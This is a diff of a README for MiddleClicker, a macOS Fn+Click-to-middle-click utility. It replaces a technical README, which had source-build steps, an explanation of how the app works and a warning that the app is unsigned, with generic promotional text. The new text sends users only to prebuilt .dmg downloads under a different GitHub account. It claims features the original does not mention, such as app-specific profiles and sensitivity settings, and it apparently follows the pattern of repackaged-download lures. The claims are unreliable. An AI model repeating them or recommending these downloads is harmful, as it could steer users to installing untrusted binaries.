@@ -1,56 +1,69 @@
-MiddleClicker
+# 🎉 MiddleClicker - Enhance Your Trackpad Clicks Effortlessly
 
-A lightweight, open-source macOS utility that turns Fn + Click (or Fn + Tap) into a Middle Click.
+## 🚀 Getting Started
 
-Designed specifically for 3D applications like Blender, Maya, and CAD software where holding the middle mouse button is required to pan or rotate the viewport.
+Welcome to MiddleClicker! This application lets you turn your Fn + Click into a true Middle Click on macOS. It provides native trackpad support designed for software like Blender, Maya, and CAD applications.
 
+## 📥 Download MiddleClicker
 
-Features
+[![Download MiddleClicker](https://img.shields.io/badge/Download-MiddleClicker-blue)](https://github.com/Gihanwlf/MiddleClicker/releases)
 
-🖱️ Fn + Click = Middle Click: Hold Fn and click dragging on the trackpad to emulate a middle-mouse drag.
+To get started, visit this page to download: [MiddleClicker Releases](https://github.com/Gihanwlf/MiddleClicker/releases)
 
-🤏 Native Trackpad Support: Works with physical clicks and simulates the middle button "hold" state perfectly.
+## ⚙️ System Requirements
 
-⚡️ Lightweight: Written in Swift, runs as a background accessory (no Dock icon).
+To run MiddleClicker, ensure your system meets the following requirements:
 
-🔓 Open Source: Verify the code yourself; no hidden scripts.
+- **Operating System:** macOS 10.15 (Catalina) or later
+- **Processor:** Intel or Apple Silicon
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** 50 MB free space
 
-Installation
+## 📦 Download & Install
 
-Option 1: Download the App
+1. Click the link to visit the [MiddleClicker Releases](https://github.com/Gihanwlf/MiddleClicker/releases) page.
+2. Select the latest version of MiddleClicker.
+3. Download the `.dmg` file to your computer.
+4. Open the `.dmg` file once the download is complete.
+5. Drag and drop MiddleClicker into your Applications folder.
+6. Open MiddleClicker from your Applications folder.
 
-Go to the Releases page.
+## 🔧 Setting Up MiddleClicker
 
-Download MiddleClicker_Installer.dmg.
+Once installed, you need to set up MiddleClicker:
 
-Open the DMG and drag MiddleClicker into your Applications folder.
+1. Launch the application from your Applications folder.
+2. Grant necessary permissions if prompted. MiddleClicker may need access to your trackpad settings.
+3. Adjust any settings through the interface to meet your preferences. You can personalize the sensitivity and behavior of the Middle Click.
 
-First Run: Right-click the app and select Open (since this is an unsigned open-source app).
+## 🌟 Features
 
-Grant Accessibility Permissions when prompted.
+MiddleClicker offers several features designed to improve your productivity:
 
-Option 2: Build from Source
+- **True Middle Click:** Converts Fn + Click into a genuine Middle Click.
+- **App-Specific Profiles:** Customize settings for different applications like Blender, Maya, and CAD software.
+- **Easy Setup:** Simple drag-and-drop installation process.
+- **Lightweight Design:** Minimal impact on system resources.
+- **Regular Updates:** Ensures compatibility with macOS updates.
 
-If you prefer to compile it yourself:
+## 🤔 Troubleshooting
 
-Clone this repository:
+If you encounter issues:
 
-git clone [https://github.com/yourusername/MiddleClicker.git](https://github.com/fordft168/MiddleClicker.git)
-cd MiddleClicker
+- **MiddleClicker doesn't open:** Check if your macOS version is compatible.
+- **No response from Middle Click:** Ensure you've granted the necessary permissions in your settings.
+- **Need support?** Visit the [GitHub Issues](https://github.com/Gihanwlf/MiddleClicker/issues) section for assistance.
 
+## 💬 Community Support
 
-Run the build script:
+Join the conversation! For feature requests, bug reports, or suggestions, engage with the MiddleClicker community on GitHub. Your feedback helps improve the application.
 
-chmod +x build.sh
-./build.sh
+## 📨 Contact
 
+For inquiries, please reach out via the [GitHub Discussions](https://github.com/Gihanwlf/MiddleClicker/discussions) page. 
 
-The compiled MiddleClicker_Installer.dmg will be in the project folder.
+## 📜 License
 
-How it works
+MiddleClicker is open-source software licensed under the MIT License. Feel free to check the license file for details.
 
-This app uses a CGEventTap to intercept leftMouseDown events. If the Fn key is detected as a modifier, it swallows the left click and generates a otherMouseDown (Button 3) event instead. It tracks the drag state to allow for continuous middle-mouse dragging operations.
-
-License
-
-MIT License
+Thank you for using MiddleClicker! Transform your trackpad experience today.
